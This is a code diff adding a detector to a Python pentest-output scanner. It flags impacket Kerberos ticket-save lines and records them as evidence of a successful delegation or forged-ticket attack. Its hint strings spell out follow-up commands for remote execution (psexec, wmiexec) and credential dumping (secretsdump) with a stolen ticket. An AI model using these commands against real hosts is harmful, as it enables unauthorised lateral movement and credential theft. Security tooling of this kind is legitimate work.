@@ -6382,6 +6382,42 @@ def _multiline_passes(path, report, store):
                              f"AES keys survive password rotations if "
                              f"salted with the same domain+user"))
 
+    # iter-264: impacket-getST / getTGT / ticketer / goldenPac all end
+    # with `[*] Saving ticket in USER.ccache` (or `TGT/TGS`). This is the
+    # ATTACK-LANDED marker for Kerberos delegation, S4U2Self/Proxy, RBCD,
+    # and forged golden/silver tickets. Feed the ccache filename into
+    # Evidence so R-KERB chain rules see "operator has ticket ready".
+    # Doc-file gated - walkthroughs paste this line verbatim.
+    _KRB_TICKET_SAVE = re.compile(
+        r'(?im)^\s*\[\*\]\s*Saving\s+(?:the\s+)?(?:TGT|TGS|ticket)\s+in\s+'
+        r'[\'"]?([A-Za-z0-9._@\-\$\+\=]{1,120}\.ccache)[\'"]?\s*$')
+    if not filters.is_doc_file(path):
+        _kts_seen = set()
+        for _tm in _KRB_TICKET_SAVE.finditer(text):
+            _ccache = _tm.group(1)
+            if _ccache in _kts_seen:
+                continue
+            _kts_seen.add(_ccache)
+            # Extract the user identity from typical impacket ccache names:
+            #   `svc_backup.ccache` -> svc_backup
+            #   `Administrator@cifs_dc.corp.local@CORP.LOCAL.ccache` -> Administrator
+            _who = _ccache.split("@", 1)[0].removesuffix(".ccache")
+            _who_sh = _who.replace("'", "'\\''")
+            _ccache_sh = _ccache.replace("'", "'\\''")
+            report.add("HIGH", "RECON", path, _ln(_tm),
+                       f"Kerberos ticket saved: {_ccache} (impacket "
+                       f"getST/getTGT/ticketer landed)",
+                       hint=(f"export KRB5CCNAME='{_ccache_sh}'  |  "
+                             f"impacket-psexec -k -no-pass '{_who_sh}'"
+                             f"@<host-fqdn>  |  or wmiexec/smbexec/"
+                             f"secretsdump -k -no-pass <host-fqdn>  |  "
+                             f"target-hostname must be FQDN not IP for "
+                             f"Kerberos SPN validation"))
+            if store is not None:
+                store.add(Evidence(kind="ccache", user=_who,
+                                   source=path, line=_ln(_tm),
+                                   meta={"path": _ccache}))
+
     # Mimikatz dpapi::cred typed
     for m in _MK_DPAPI_CRED.finditer(text):
         if not _no_bleed(m, 1, 3, _MK_CRED_BLEED):
